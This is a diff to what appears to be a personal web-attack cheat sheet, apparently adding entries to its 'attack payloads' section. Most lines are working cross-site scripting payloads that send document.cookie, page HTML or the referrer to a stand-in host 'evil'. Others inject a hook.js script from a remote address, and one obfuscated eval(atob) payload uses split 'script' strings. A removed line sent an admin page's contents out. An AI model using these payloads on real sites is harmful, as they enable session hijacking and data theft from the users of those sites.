@@ -120,16 +120,20 @@ feed://evil.cm%2f/x.rss%3f@vulnsite.com/
 asp.net: the csrf protection is to actually include the session ID is in the ViewState (owasp)
 
 # attack payloads
-window.location='https://evil/?'.concat(document.cookie);
+window.location='https://evil/?c='.concat(document.cookie);
+
+<script src="data:, location.replace('https://evil/?c='.concat(document.cookie));"
+<script src="data:text/javascript, fetch('https://evil/'+document.cookie,{method:'POST',mode:'no-cors',body:document.body.innerText})"
+
 new Image().src="https://evil/?c="+encodeURIComponent(btoa(window.top.frames[0].document.body.innerHTML));
+
 <img src=x onerror="fetch('https://evil/?c='%2bdocument.referrer)"> # https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
 <img src=x onerror=eval(atob(..))> == onerror=eval(unescape(/x%3dnew%20XMLHTTPRequest%28%29%3b.../.source))>
-
-fetch("https://site/admin").then(r => r.text()).then(t => fetch("//evil/"+btoa(t)));
 
 <iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://evil/?c="+document.cookie)></iframe>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://x.x.x.x:3000/hook.js";document.body.appendChild(sc);'/>
 <iframe src=//evil /> and index.html: <script src="http://x.x.x.x:3000/hook.js" type="text/javascript"></script>
+
 document.body.appendChild(document.createElement("script")).src="http://x.x.x.x:3000/hook.js"
 
 <script>var x=new XMLHttpRequest();x.open("POST","http://evil/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send("x="+btoa(document.body.innerHTML));</script>
